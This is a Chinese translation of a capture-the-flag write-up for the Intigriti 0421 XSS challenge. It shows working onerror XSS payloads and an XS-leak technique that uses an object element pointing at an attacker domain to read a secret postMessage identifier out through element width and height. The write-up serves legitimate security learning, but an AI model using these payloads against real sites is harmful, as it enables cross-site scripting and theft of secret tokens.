<html>
<head>
<title>Solution for Terjanq x Intigriti’s 0421 challenge</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Terjanq x Intigriti 0421挑战的解决方案</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/solution-for-terjanq-x-intigritis-0421-challenge-ae68556cfcf1?source=collection_archive---------0-----------------------#2021-04-26">https://infosecwriteups.com/solution-for-terjanq-x-intigritis-0421-challenge-ae68556cfcf1?source=collection_archive---------0-----------------------#2021-04-26</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="c7e8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">本月的Intigriti挑战赛由令人惊叹的<a class="ae kl" href="https://twitter.com/terjanq" rel="noopener ugc nofollow" target="_blank"> Terjanq </a>制作。他自己写了一篇很酷的文章<a class="ae kl" href="https://easterxss.terjanq.me/writeup.html" rel="noopener ugc nofollow" target="_blank">！不出所料，这次挑战非同寻常。复杂，令人沮丧，超级有趣。</a></p><p id="1876" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">声明:我写这篇文章不是为了睡觉，所以我提前为错别字和混乱的句子道歉。</p><p id="27e7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们开始吧！</p><p id="9ce1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">查看挑战页面，我们看到以下脚本:</p><figure class="km kn ko kp gt kq"><div class="bz fp l di"><div class="kr ks l"/></div></figure><p id="d29a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到GET参数<code class="fe kt ku kv kw b">error</code>用于在页面上创建一个“错误”消息。有趣的是，GET参数的值使用<code class="fe kt ku kv kw b">innerHTML</code>插入到DOM中，如第17行所示。然而，在我们到达非常有前途的代码行之前，我们的GET参数必须经历一个漫长的净化过程。首先，GET参数的值通过postMessage发送到页面<code class="fe kt ku kv kw b">/waf.html</code>。作为postMessage的一部分，还包含了一个名为<code class="fe kt ku kv kw b">identifier</code>的变量的值。该值是通过使用<code class="fe kt ku kv kw b"><a class="ae kl" href="https://developer.mozilla.org/en-US/docs/Web/API/Crypto/getRandomValues" rel="noopener ugc nofollow" target="_blank">Crypto.getRandomValues()</a></code>生成的“密码强随机值”。让我们跳到<code class="fe kt ku kv kw b">/waf.html</code>看看那边发生了什么:</p><figure class="km kn ko kp gt kq"><div class="bz fp l di"><div class="kr ks l"/></div></figure><p id="51db" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正如我们在上面的脚本中看到的，<code class="fe kt ku kv kw b">/waf.html</code>作为一个WAF工作(真是一个惊喜)。我不会深入讨论这个WAF是做什么的，但是如果你愿意，你可以自己看看。重要的是要知道，WAF实际上允许我们执行一些JavaScript代码，但是我们能做的非常有限。我们的JavaScript代码不能包含第13行看到的任何字符:<code class="fe kt ku kv kw b">" ' ` ( ) { } [ ] =</code>。为了举例说明如何执行一些JavaScript，我们可以为<code class="fe kt ku kv kw b">error</code> GET参数使用以下有效负载:</p><pre class="km kn ko kp gt kx kw ky kz aw la bi"><span id="bfed" class="lb lc iq kw b gy ld le l lf lg">&lt;img src=x onerror=location++&gt;</span></pre><p id="e800" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">(记住对<code class="fe kt ku kv kw b">+</code>进行URL编码)</p><p id="a946" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这会将我们重定向到<code class="fe kt ku kv kw b">/NaN</code>，因为我们试图将<code class="fe kt ku kv kw b">location</code>对象递增1，即使<code class="fe kt ku kv kw b">location</code>不是Number类型。</p><p id="972d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在我们的GET参数通过WAF运行之后，一条postMessage被发送回主挑战页面，带有一个参数<code class="fe kt ku kv kw b">safe</code>，它描述了<code class="fe kt ku kv kw b">error</code> GET参数的值是否通过了WAF。那辆<code class="fe kt ku kv kw b">identifier</code>也再次被送了回来。然后用<code class="fe kt ku kv kw b">identifier</code>来确保邮件确实来自<code class="fe kt ku kv kw b">/waf.html</code>，而不是由攻击者发送的“邪恶”邮件。</p><p id="6134" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在与<a class="ae kl" href="https://twitter.com/RobinZekerNiet" rel="noopener ugc nofollow" target="_blank"> Robin </a>简短地谈论了Terjanq的挑战看起来是多么的艰难之后，他提到了Terjanq是多么的喜欢XS泄密，并且为这个超级酷的资源做出了贡献:<a class="ae kl" href="https://xsleaks.com/" rel="noopener ugc nofollow" target="_blank">https://xsleaks.com/</a>。正因为如此，我决定把重点放在提取<code class="fe kt ku kv kw b">identifier</code>值的可能性上。如果我们能这样做，我们就能发送一个包含我们想要的HTML内容的“邪恶的”postMessage。这似乎是一个非常困难的任务，因为我们可以使用的JavasScript代码非常有限，但事实证明这是可能的！</p><p id="5235" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">想了很多，我意识到一件很重要的事情。在JavaScript中，可以用小于和大于运算符来比较字符串。一些例子可能是:</p><pre class="km kn ko kp gt kx kw ky kz aw la bi"><span id="9e7f" class="lb lc iq kw b gy ld le l lf lg">"a" &lt; "b" -&gt; true<br/>"abzd" &gt; "abcd" -&gt; true<br/>"#b" &lt; "#abcd" -&gt; false<br/>"#0a4z" &lt; "#0a4" -&gt; false</span></pre><p id="1359" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这意味着我们可以将<code class="fe kt ku kv kw b">identifier</code>变量的值与其他字符串进行比较。我们不能在比较中直接输入一个字符串，因为我们不能使用任何一个<code class="fe kt ku kv kw b">"’`</code>，所以我们必须从其他地方获取一个字符串，比如从一个元素的<code class="fe kt ku kv kw b">id</code>中。例如，我们可以这样做:</p><pre class="km kn ko kp gt kx kw ky kz aw la bi"><span id="b14c" class="lb lc iq kw b gy ld le l lf lg">&lt;img src=x id=d onerror=this.id&lt;identifier&gt;</span></pre><p id="ff17" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这将确定<code class="fe kt ku kv kw b">identifier</code>的第一个字符是否“大于”字符“d”。</p><p id="f5ae" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">虽然这很酷，但在它变得有用之前，我们有一些明显的限制要克服。</p><ol class=""><li id="fb8a" class="lh li iq jp b jq jr ju jv jy lj kc lk kg ll kk lm ln lo lp bi translated">首先，我们没有办法知道比较的结果是什么。</li><li id="b198" class="lh li iq jp b jq lq ju lr jy ls kc lt kg lu kk lm ln lo lp bi translated">我们只做了一个简单的比较，这并不能给我们太多的信息。我们必须进行一系列的比较，才能真正获得一些有用的信息。</li></ol><p id="b928" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们还需要记住，每次更新页面时,<code class="fe kt ku kv kw b">identifier</code>的值都会改变……这看起来当然不是一些容易克服的限制，但是让我们试试吧！</p><p id="0300" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了解决问题“2 ”,我们也许可以使用<code class="fe kt ku kv kw b">location.hash</code>来访问URL片段。这似乎是一个有趣的想法，因为可以在不更新页面的情况下更改URL片段！换句话说，理论上我们可以在不改变<code class="fe kt ku kv kw b">identifier</code>的情况下进行多重比较。实现这一目标的一个例子是:</p><pre class="km kn ko kp gt kx kw ky kz aw la bi"><span id="2406" class="lb lc iq kw b gy ld le l lf lg">var url = "<a class="ae kl" href="https://challenge-0421.intigriti.io/" rel="noopener ugc nofollow" target="_blank">https://challenge-0421.intigriti.io/</a>?error=&lt;img src=x id=d onerror=this.id&lt;identifier;this.src%2B%2B&gt;";</span><span id="fd87" class="lb lc iq kw b gy lv le l lf lg">var w=window.open(url+"#a");</span><span id="f807" class="lb lc iq kw b gy lv le l lf lg">setTimeout(function(){w.location=url+"#b"},1000);<br/>setTimeout(function(){w.location=url+"#c"},2000);<br/>setTimeout(function(){w.location=url+"#d"},3000);</span></pre><p id="c6c0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">注意我们如何在一个“循环”中使用<code class="fe kt ku kv kw b">this.src++</code>来触发<code class="fe kt ku kv kw b">onerror</code>事件。</p><p id="554f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们仍然必须弄清楚如何实际“渗透”比较的结果。</p><p id="df8c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">看着<code class="fe kt ku kv kw b">/waf.html</code>，我们可能会注意到我们被允许使用<code class="fe kt ku kv kw b">object</code>元素。这给了我们一些有趣的可能性。同源策略对我们在网站上嵌入其他域时可以检索的信息有很多限制，但顾名思义，这(当然)只是在父窗口和嵌入窗口不共享同一源的情况下。如果我们从攻击者控制的域中打开挑战页面，就像前面的例子一样，然后让挑战页面将攻击者控制的域嵌入到一个<code class="fe kt ku kv kw b">object</code>元素中，会怎么样？这使得从攻击者控制的域的上下文中访问<code class="fe kt ku kv kw b">object</code>元素的contentWindow成为可能，而没有任何同源策略问题。</p><pre class="km kn ko kp gt kx kw ky kz aw la bi"><span id="24a0" class="lb lc iq kw b gy ld le l lf lg">var url = "<a class="ae kl" href="https://challenge-0421.intigriti.io/" rel="noopener ugc nofollow" target="_blank">https://challenge-0421.intigriti.io/</a>?error=&lt;object data=https://attacker_domain&gt;";</span><span id="7065" class="lb lc iq kw b gy lv le l lf lg">var w=window.open(url);</span><span id="ded7" class="lb lc iq kw b gy lv le l lf lg">setTimeout(function(){console.log(w.window[1])},1000);</span></pre><p id="9cf3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这令人兴奋的原因是，我们实际上可以用它来解释我们比较的结果！为此，我决定使用<code class="fe kt ku kv kw b">object</code>元素的宽度和高度属性。其工作原理是，挑战页面将修改其中一个属性，然后我们可以通过<code class="fe kt ku kv kw b">innerHeight</code>和<code class="fe kt ku kv kw b">innerWidth</code>从攻击者控制的页面中读取这些属性。一个例子如下:</p><pre class="km kn ko kp gt kx kw ky kz aw la bi"><span id="19d0" class="lb lc iq kw b gy ld le l lf lg">var url = "<a class="ae kl" href="https://challenge-0421.intigriti.io/" rel="noopener ugc nofollow" target="_blank">https://challenge-0421.intigriti.io/</a>?error=&lt;object id=a data=https://attacker_domain&gt;&lt;img src=x onerror=a.height%2B%2B;this.src%2B%2B&gt;";</span><span id="2967" class="lb lc iq kw b gy lv le l lf lg">var w=window.open(url);</span><span id="0480" class="lb lc iq kw b gy lv le l lf lg">setInterval(function(){console.log(w.window[1].innerHeight)},1000);</span></pre><p id="68f2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们现在都能够进行多重比较并导出结果！现在剩下的是大量的工作，实际上将这些技术放在一起，以创建一个完全工作的PoC。一些基本的想法是这样做:</p><pre class="km kn ko kp gt kx kw ky kz aw la bi"><span id="3836" class="lb lc iq kw b gy ld le l lf lg">location.hash&lt;this.id+identifier&amp;&amp;a.height++</span></pre><p id="fa16" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果散列是<code class="fe kt ku kv kw b">#a</code>，上面的内容将被转换为:</p><pre class="km kn ko kp gt kx kw ky kz aw la bi"><span id="0b72" class="lb lc iq kw b gy ld le l lf lg">"#a"&lt;"#"+identifier&amp;&amp;a.height++</span></pre><p id="6407" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果标识符的第一个字符“大于”a，这个逻辑将只增加id为<code class="fe kt ku kv kw b">a</code>的<code class="fe kt ku kv kw b">object</code>元素的高度。</p><p id="75de" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">基于上面的想法，我创建了我的PoC代码，我对它并不满意，但是你可以在这篇文章的底部找到它。</p><p id="7091" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">简而言之，它执行以下操作:</p><p id="3013" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在“挑战”页面上:</p><ol class=""><li id="dabd" class="lh li iq jp b jq jr ju jv jy lj kc lk kg ll kk lm ln lo lp bi translated">等待哈希发生变化</li><li id="3dd8" class="lh li iq jp b jq lq ju lr jy ls kc lt kg lu kk lm ln lo lp bi translated">检查提供的散列是否比标识符“小”,如果是这样，增加<code class="fe kt ku kv kw b">object</code>元素的宽度</li><li id="8dbf" class="lh li iq jp b jq lq ju lr jy ls kc lt kg lu kk lm ln lo lp bi translated">检查提供的散列值是否“大于”标识符，如果是这样，就增加<code class="fe kt ku kv kw b">object</code>元素的高度</li></ol><p id="2f6e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在攻击者控制的页面上:</p><ol class=""><li id="a430" class="lh li iq jp b jq jr ju jv jy lj kc lk kg ll kk lm ln lo lp bi translated">等待<code class="fe kt ku kv kw b">object</code>元素的大小改变</li><li id="f277" class="lh li iq jp b jq lq ju lr jy ls kc lt kg lu kk lm ln lo lp bi translated">检查哪个值发生了变化，并使用它逐字符缩小<code class="fe kt ku kv kw b">identifier</code>值的可能性(使用二进制搜索)</li><li id="8074" class="lh li iq jp b jq lq ju lr jy ls kc lt kg lu kk lm ln lo lp bi translated">最后向挑战页面发送一条包含正确标识符的邮件，以弹出警报！</li></ol><p id="959e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你可以在这篇文章的底部阅读更详细的解释。</p><p id="dbe7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">运行PoC代码，我们得到以下结果:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi lw"><img src="../Images/50bfdfcb3fc07ea5246ee54433d91f99.png" data-original-src="https://miro.medium.com/v2/resize:fit:1200/1*vYZHca3cElzdJ_uuWh2QMA.gif"/></div></figure><p id="c993" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">漂亮，对！？</p><p id="d4f4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">非常感谢挑战<a class="ae kl" href="https://twitter.com/terjanq" rel="noopener ugc nofollow" target="_blank"> Terjanq </a>和Intigriti！非常感谢您的阅读！如果你有任何问题，请随时联系我。</p><p id="3bbc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Happy hacking，<br/> <a class="ae kl" href="https://twitter.com/holme_sec" rel="noopener ugc nofollow" target="_blank"> @holme_sec </a></p></div><div class="ab cl lz ma hu mb" role="separator"><span class="mc bw bk md me mf"/><span class="mc bw bk md me mf"/><span class="mc bw bk md me"/></div><div class="ij ik il im in"><p id="9891" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">关于挑战页面上使用的“逻辑”有效负载的更多信息:</strong></p><p id="a4c9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">以下是用于比较<code class="fe kt ku kv kw b">identifier</code>变量的解码“逻辑”有效载荷:</p><pre class="km kn ko kp gt kx kw ky kz aw la bi"><span id="7bc9" class="lb lc iq kw b gy ld le l lf lg">&lt;img src=x id=#NaN name=# onerror=this.id&lt;location.hash||location.hash&lt;this.id||this.src+++bla;location.hash&lt;this.name+identifier&amp;&amp;a.width++;this.name+identifier&lt;location.hash&amp;&amp;a.height++;location.hash++;this.src++&gt;</span></pre><p id="8f16" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们把它分成更小的部分。</p><p id="684f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">第一部分:</p><pre class="km kn ko kp gt kx kw ky kz aw la bi"><span id="7bfa" class="lb lc iq kw b gy ld le l lf lg">this.id&lt;location.hash||location.hash&lt;this.id||this.src+++bla;</span></pre><p id="9fc2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这一部分用于确保当URL片段改变时，我们只运行一次代码的下一部分。它通过使用OR ( <code class="fe kt ku kv kw b">||</code>)操作符来实现。它首先检查当前哈希是否大于<code class="fe kt ku kv kw b">this.id</code>。<code class="fe kt ku kv kw b">img</code>标签的id是<code class="fe kt ku kv kw b">#NaN</code>，所以如果hash等于或大于<code class="fe kt ku kv kw b">#NaN</code>，则为假。接下来，进行检查以确定当前散列是否小于<code class="fe kt ku kv kw b">this.id</code>，这也是<code class="fe kt ku kv kw b">#NaN</code>。因为这是用OR运算符完成的，所以只要其中一个语句为真，整个语句就为真。这意味着一旦当前语句为真，就没有必要继续检查其余的语句。例如，如果当前散列值大于<code class="fe kt ku kv kw b">#NaN</code>，那么接下来的两条语句将被跳过，而不会被求值。然而，如果当前散列是<strong class="jp ir">，既不大于</strong>，也不小于<code class="fe kt ku kv kw b">#NaN</code>，这意味着当前散列必须等于<code class="fe kt ku kv kw b">#NaN</code>，我们将继续到第三个也是最后一个语句:</p><pre class="km kn ko kp gt kx kw ky kz aw la bi"><span id="8dfe" class="lb lc iq kw b gy ld le l lf lg">this.src+++bla</span></pre><p id="39ba" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在评估这条语句时，我们将首先更新<code class="fe kt ku kv kw b">img</code>元素的<code class="fe kt ku kv kw b">src</code>。我们这样做是为了确保在循环中调用<code class="fe kt ku kv kw b">onerror</code>事件处理程序。接下来，我们尝试运行无效的JavaScript代码<code class="fe kt ku kv kw b">bla</code>。这样做的原因是确保我们在代码中创建一个错误，以避免执行<code class="fe kt ku kv kw b">onerror</code>事件处理程序中的任何剩余代码。这种机制允许我们创建一些逻辑来控制何时执行一些代码。本质上这是一个糟糕的if语句。</p><p id="50da" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">第二部分:</p><pre class="km kn ko kp gt kx kw ky kz aw la bi"><span id="ef8d" class="lb lc iq kw b gy ld le l lf lg">location.hash&lt;this.name+identifier&amp;&amp;a.width++;</span></pre><p id="2e85" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这部分检查<code class="fe kt ku kv kw b">identifier</code>变量是否大于当前散列。我们将<code class="fe kt ku kv kw b">this.name</code>前置为<code class="fe kt ku kv kw b">#</code>，因为<code class="fe kt ku kv kw b">location.hash</code>返回以<code class="fe kt ku kv kw b">#</code>字符开头的URL片段。如果比较结果为真，我们将<code class="fe kt ku kv kw b">object</code>元素的宽度增加1。</p><p id="fc97" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">第三部分:</p><pre class="km kn ko kp gt kx kw ky kz aw la bi"><span id="afbd" class="lb lc iq kw b gy ld le l lf lg">this.name+identifier&lt;location.hash&amp;&amp;a.height++;</span></pre><p id="0a47" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这一部分与第二部分非常相似。它检查<code class="fe kt ku kv kw b">identifier</code>变量是否小于当前散列，如果是，则将<code class="fe kt ku kv kw b">object</code>元素的高度增加1。</p><p id="e875" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">第四部分:</p><pre class="km kn ko kp gt kx kw ky kz aw la bi"><span id="0aca" class="lb lc iq kw b gy ld le l lf lg">location.hash++;this.src++</span></pre><p id="2fe5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后一部分从散列值加1开始，这将使它的值为<code class="fe kt ku kv kw b">NaN</code>，因为散列值不属于Number类型。这样做是为了使用我们在第1部分中的逻辑，以确保我们每次在散列中收到新值时只运行第2–4部分一次。最后，增加了<code class="fe kt ku kv kw b">this.src</code>以确保我们将在循环中调用<code class="fe kt ku kv kw b">onerror</code>事件处理程序。</p></div><div class="ab cl lz ma hu mb" role="separator"><span class="mc bw bk md me mf"/><span class="mc bw bk md me mf"/><span class="mc bw bk md me"/></div><div class="ij ik il im in"><p id="cc59" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> PoC代码:</strong></p><figure class="km kn ko kp gt kq"><div class="bz fp l di"><div class="kr ks l"/></div></figure></div></div>    
</body>
</html>